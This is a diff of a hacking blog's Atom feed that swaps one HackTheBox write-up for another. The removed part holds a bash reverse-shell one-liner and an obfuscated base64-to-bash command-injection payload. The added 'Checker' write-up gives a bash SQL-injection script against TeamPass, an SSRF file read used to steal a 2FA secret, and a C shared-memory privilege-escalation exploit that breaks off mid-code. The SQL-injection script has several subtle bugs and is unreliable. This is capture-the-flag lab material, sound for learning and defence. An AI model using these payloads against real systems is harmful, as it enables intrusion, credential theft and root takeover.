@@ -1,139 +1,1655 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://your-site-url/feed.xml" rel="self" type="application/atom+xml" /><link href="https://your-site-url/" rel="alternate" type="text/html" /><updated>2025-07-19T20:20:54+00:00</updated><id>https://your-site-url/feed.xml</id><title type="html">Pwn3d777</title><subtitle>This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i&apos;ve developed
-</subtitle><author><name>GitHub User</name></author><entry><title type="html">CozyHosting</title><link href="https://your-site-url/jekyll/update/2025/07/19/cozy.html" rel="alternate" type="text/html" title="CozyHosting" /><published>2025-07-19T16:05:57+00:00</published><updated>2025-07-19T16:05:57+00:00</updated><id>https://your-site-url/jekyll/update/2025/07/19/cozy</id><content type="html" xml:base="https://your-site-url/jekyll/update/2025/07/19/cozy.html"><![CDATA[<h1 id="cozyhosting">CozyHosting</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://your-site-url/feed.xml" rel="self" type="application/atom+xml" /><link href="https://your-site-url/" rel="alternate" type="text/html" /><updated>2025-07-19T23:13:49+00:00</updated><id>https://your-site-url/feed.xml</id><title type="html">Pwn3d777</title><subtitle>This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i&apos;ve developed
+</subtitle><author><name>GitHub User</name></author><entry><title type="html">Checker 1eab952552918014a431c736eae89e54</title><link href="https://your-site-url/writeups/2025/07/17/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e.html" rel="alternate" type="text/html" title="Checker 1eab952552918014a431c736eae89e54" /><published>2025-07-17T16:05:57+00:00</published><updated>2025-07-17T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/17/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/17/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e.html"><![CDATA[<h1 id="checker">Checker</h1>
 
-<p>HackTheBox: Easy</p>
+<h1 id="1-enumeration">1. Enumeration</h1>
 
-<blockquote>
-  <p>Cozyhosting is an Ubuntu system when you can practices technique as cookie hijacking, reverse shells, password hashing.</p>
+<p>As always we start with nmap, there are three ports open</p>
 
-</blockquote>
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image.png" alt="image.png" /></p>
 
-<h2 id="1-enumeration">1: Enumeration</h2>
+<p>In port 80 there is a bookstack login, default credentials do not work, we cannot register a new user</p>
 
-<ul>
-  <li>Check the active connection</li>
-</ul>
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_1.png" alt="image.png" /></p>
 
-<p><img src="/assets/images/cozyhosting/Untitled.png" alt="Untitled" /></p>
+<p>We also can reset passwords</p>
 
-<ul>
-  <li>Scanning ports</li>
-</ul>
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_2.png" alt="image.png" /></p>
 
-<p><img src="/assets/images/cozyhosting/Untitled%201.png" alt="Untitled" /></p>
+<p>TeamPass service is running on port 8080</p>
 
-<p>We can see there’s a web services running in 80 port and ssh service in 22 port it could be a way to get in later.</p>
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_3.png" alt="image.png" /></p>
 
-<ul>
-  <li>Dirsearch looking for enable directories</li>
-</ul>
+<p>Search a little bit to find a vulnerability</p>
 
-<p><img src="/assets/images/cozyhosting/Untitled%202.png" alt="Untitled" /></p>
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_4.png" alt="image.png" /></p>
 
-<p>Something interesting in /actuator/sessions</p>
+<p>We don’t have any teampass version disclosed, but a poc of CVE-2023-1545 is present in here and we don’t lose anything if we try</p>
 
-<h2 id="2-looking-around">2: Looking around</h2>
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_5.png" alt="image.png" /></p>
 
-<ul>
-  <li>There is a possible cookie hijacking vulnerability.</li>
-</ul>
+<p>It is performing a sql injection giving it a new fake file that is not saved in the database but is compiled with the purpose of spoof the list of valid users, making a login as admin with a lure hash, extracting all users directly from the database.</p>
 
-<p><img src="/assets/images/cozyhosting/Untitled%203.png" alt="Untitled" /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Check number of arguments</span>
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-lt</span> 1]<span class="p">;</span> <span class="k">then</span>
+	<span class="c">#Output the name of the script</span>
+	<span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> &lt;base-url&gt;"</span> 
+	<span class="nb">exit </span>1
+<span class="k">fi</span>
 
-<ul>
-  <li>We can use BurpSuite</li>
-</ul>
+<span class="c">#Set vulnerable endpoint</span>
+<span class="nv">vulnerable_url</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">/api/index.php/authorize"</span>
 
-<p><img src="/assets/images/cozyhosting/Untitled%204.png" alt="Untitled" /></p>
+<span class="c">#Check if the api is enabled</span>
+<span class="nv">check</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--silent</span> <span class="s2">"</span><span class="nv">$vulnerable_url</span><span class="s2">"</span><span class="si">)</span>
+<span class="k">if </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$check</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"API usage is not allowed"</span><span class="p">;</span> <span class="k">then
+	</span><span class="nb">echo</span> <span class="s2">"API feature no enabled, not vulnerable"</span>
+	<span class="nb">exit </span>1
+<span class="k">fi</span>
 
-<ul>
-  <li>We simulate the log in process and inject the cookie, we change it at the right side bar</li>
-</ul>
+<span class="c">#Define a random bcrypt hash to act as lure</span>
+<span class="c">#htpasswd -bnBC 10 "" pwned | tr -d ':\n'</span>
+<span class="nv">random_hash</span><span class="o">=</span><span class="s1">'randomhash'</span>
 
-<p><img src="/assets/images/cozyhosting/Untitled%205.png" alt="Untitled" /></p>
+exec_sql<span class="o">()</span> <span class="o">{</span>
+	<span class="c">#SELECT * FROM invitados WHERE nombre = 'none'</span>
+	<span class="c">#UNION</span>
+	<span class="c">#SELECT this is admin info FROM users WHERE login='admin'</span>
+	<span class="nv">inject</span><span class="o">=</span><span class="s2">"none' UNION SELECT id, '</span><span class="nv">$random_hash</span><span class="s2">', (</span><span class="nv">$1</span><span class="s2">), private_key, personal_folder, fonction_id, groupes_interdits, 'foo' FROM temapass_users WHERE login='admin'"</span>
+	<span class="nv">data</span><span class="o">=</span><span class="s2">"{</span><span class="se">\"</span><span class="s2">login</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">"</span><span class="nv">$inject</span><span class="se">\"</span><span class="s2">",</span><span class="se">\"</span><span class="s2">password</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">newpass</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">apikey</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">foo</span><span class="se">\"</span><span class="s2">}"</span>
+	<span class="nv">token</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--silent</span> <span class="nt">--header</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"</span><span class="nv">$data</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$vulnerable_url</span><span class="s2"> | jq -r '.token'"</span><span class="si">)</span>
+<span class="o">}</span>
 
-<p><img src="/assets/images/cozyhosting/Untitled%206.png" alt="Untitled" /></p>
+<span class="c">#$Change $1 with the query replaced with public key</span>
+<span class="nb">users</span><span class="o">=</span><span class="si">$(</span>exec_sql <span class="s2">"SELECT COUNT(*) FROM teampass_users WHERE pw != ''"</span><span class="si">)</span>
 
-<h2 id="3-user-flag">3: User flag</h2>
+<span class="nb">echo</span> <span class="s2">"There are </span><span class="nv">$users</span><span class="s2"> users in the system:"</span>
 
-<ul>
-  <li>It executes commands, so get can make a rev shell to get access</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/&lt;your-ip&gt;/&lt;your-port&gt; 0&gt;&amp;1"</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0
+<span class="k">for </span>i <span class="k">in</span> <span class="sb">`</span><span class="nb">seq </span>0 <span class="k">$((</span><span class="nv">$users</span><span class="o">-</span><span class="m">1</span><span class="k">))</span><span class="sb">`</span><span class="p">;</span> <span class="k">do
+	</span><span class="nv">username</span><span class="o">=</span><span class="si">$(</span>exec_sql <span class="s2">"SELECT login FROM teampass_users WHERE pw != ORDER BY login ASC LIMIT </span><span class="nv">$i</span><span class="s2">,1"</span><span class="si">)</span>
+	<span class="nv">password</span><span class="o">=</span><span class="si">$(</span>exec_sql <span class="s2">"SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT </span><span class="nv">$i</span><span class="s2">,1"</span><span class="si">)</span>
+	<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$username</span><span class="s2">:</span><span class="nv">$password</span><span class="s2">"</span>
+<span class="k">done</span>
 </code></pre></div></div>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span><span class="nb">echo</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span><span class="s2">"&lt;your payload here&gt;"</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span>|<span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span><span class="nb">base64</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span><span class="nt">-d</span><span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span>|<span class="k">${</span><span class="nv">IFS</span><span class="p">%??</span><span class="k">}</span>bash<span class="p">;</span>
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_6.png" alt="image.png" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>Once we have admin user, we can crack it with john</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_7.png" alt="image.png" /></p>
+
+<p>In team pass dashboard there are more bob’s passwords</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_8.png" alt="image.png" /></p>
+
+<p>This seems interesting, let’s try to login in ssh</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_9.png" alt="image.png" /></p>
+
+<p>It has 2FA and we need a verification code</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_10.png" alt="image.png" /></p>
+
+<p>Stand a little and check port 80 where is the bookstack framework and we have access thanks to the previous findings, we can create books on it</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_11.png" alt="image.png" /></p>
+
+<p>In the source code the version is disclosed</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_12.png" alt="image.png" /></p>
+
+<p>It seems to be vulnerable to CVE-2023-6199 Local File Reading via Blind Server Side Request Forgery</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_13.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_14.png" alt="image.png" /></p>
+
+<p>The attacker must have writer permissions. As we saw before bob can create and delete books</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_15.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_16.png" alt="image.png" /></p>
+
+<p>Searching around internet there is a way to enable 2FA through ssh via google-authenticator</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_17.png" alt="image.png" /></p>
+
+<p>It says a secret necessary for the verification code is in ~/google-authenticator. We may try to generate our own verification code through this secret</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_18.png" alt="image.png" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">/ajax/page/&lt;id&gt;/save-draft</code> could be the endpoint for expose the file we need</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_19.png" alt="image.png" /></p>
+
+<p>It’s time to find a PoC of concept to perform this attack.</p>
+
+<p>According with this blog post, we can use php_filter_chains_oracle_exploit to abuse this vulnerability.</p>
+
+<p>https://fluidattacks.com/es/blog/lfr-via-blind-ssrf-book-stack</p>
+
+<p>Basically this version of bookstack is using intervention image library which handles with images, it is taking all images that are present in the html source, uploading them to the server and converting the source to an url</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_20.png" alt="image.png" /></p>
+
+<p>Then it is getting the file extension and storing the image into a repo and the url is returned</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_21.png" alt="image.png" /></p>
+
+<p>If we get deeper understanding of how it is uploading the image we might be able to trick the server to disclose information</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_22.png" alt="image.png" /></p>
+
+<p>The function make can take a url, a path or a binary like it is usually here</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_23.png" alt="image.png" /></p>
+
+<p>Driver in charge to init the image is sending a GET request to the given url to load the image, we have full control over this url</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_24.png" alt="image.png" /></p>
+
+<p>There is a method to use a <code class="language-plaintext highlighter-rouge">php://</code> wrapper to filter contents we can learn more of this here:</p>
+
+<p>https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle</p>
+
+<p>Now it is time to exploit this, capture the request performed by the following endpoint</p>
+
+<p><code class="language-plaintext highlighter-rouge">/BookStack/public/ajax/page/7/save-draft</code></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_25.png" alt="image.png" /></p>
+
+<p>Get the authorization cookies needed for this</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_26.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_27.png" alt="image.png" /></p>
+
+<p>Use the next exploit setting necessary flags using <code class="language-plaintext highlighter-rouge">/etc/passwd</code> as a test file to see that it is working properly, we can use the proxy to have more control over what is happening</p>
+
+<p><a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_28.png" alt="image.png" /></p>
+
+<p>Forward all requests</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_29.png" alt="image.png" /></p>
+
+<p>Now that we know this is a valid vector attack, we need to find a way to get the OTP secret, in a book created previously for bob there are clues for the home directory</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_30.png" alt="image.png" /></p>
+
+<p>connect the dots and access the <code class="language-plaintext highlighter-rouge">.google_authenticator</code> file with the secret</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_31.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_32.png" alt="image.png" /></p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_33.png" alt="image.png" /></p>
+
+<p>Now use TOTP web application to enter the secret and get the verification code</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_34.png" alt="image.png" /></p>
+
+<p>That’s how we get the user flag</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_35.png" alt="image.png" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>Use <code class="language-plaintext highlighter-rouge">sudo -l</code> to see binaries allowed to run as root</p>
+
+<p><code class="language-plaintext highlighter-rouge">Check-leak.sh</code> is allowed to run as root, it is a custom script that given a username it sanitize the input keeping only alphanumeric characters and use a binary to determine if the username was leaked or not</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_36.png" alt="image.png" /></p>
+
+<p>Download <code class="language-plaintext highlighter-rouge">cheack_leak</code> binary to inspect it meticulously</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_37.png" alt="image.png" /></p>
+
+<p>Use FreeIDA software for this task, identify main function</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_38.png" alt="image.png" /></p>
+
+<p>This function is checking leaked hashes in a file, if the password is leaked open a shared memory location to execute a command querying the information for the hash in the database</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_39.png" alt="image.png" /></p>
+
+<p>Here we have the <code class="language-plaintext highlighter-rouge">write_to_shm</code> function, we can notice how the address memory is chosen, it takes the current time, initializes the random function taking time as seed, and generates a pseudo-random number between 0-0xFFFFF (1048575). Then it try to access to that memory address and gets a pointer for it. A message is written in this memory address with the time and hash</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_40.png" alt="image.png" /></p>
+
+<p>This memory location is used for the notify user function</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_41.png" alt="image.png" /></p>
+
+<p>This function assure the string “Leaked hash detected” is present in this memory address, then the pointer is set to point the message from the ASCII 62 (&gt;)</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_42.png" alt="image.png" /></p>
+
+<p>Set the pointer after the (&gt;) cut and clean and verify the hash</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_43.png" alt="image.png" /></p>
+
+<p>With this the mysql query is performed</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_44.png" alt="image.png" /></p>
+
+<p>Here we have a clear view of what notify user is doing with its key points</p>
+
+<p><img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_45.png" alt="image.png" /></p>
+
+<p>It’s time to use all this information to create a exploit that inject the memory address with the information we want the query to execute, use the same structure to create the seed, verify the memory reservation and access the pointer to inject the message. We can use pure C or C libraries in python</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/ipc.h&gt;</span><span class="c1"> //Key_t</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/shm.h&gt;</span><span class="c1"> //sh *</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="c1">//Get time</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span> <span class="o">=</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+	<span class="c1">//Init randomic function</span>
+	<span class="n">srand</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
+	
+	<span class="n">key_t</span> <span class="n">key</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mh">0xFFFFF</span><span class="p">;</span>
+	
+	<span class="c1">//Create shared memory and check</span>
+		<span class="kt">int</span> <span class="n">shmid</span> <span class="o">=</span> <span class="n">shmget</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="n">IPC_CREAT</span> <span class="o">|</span> <span class="mo">0666</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">shmid</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">perror</span><span class="p">(</span><span class="s">"shmget failed"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	
+	<span class="c1">// attach shared memory and gets its pointer</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">share_memory</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">shmat</span><span class="p">(</span><span class="n">shmid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
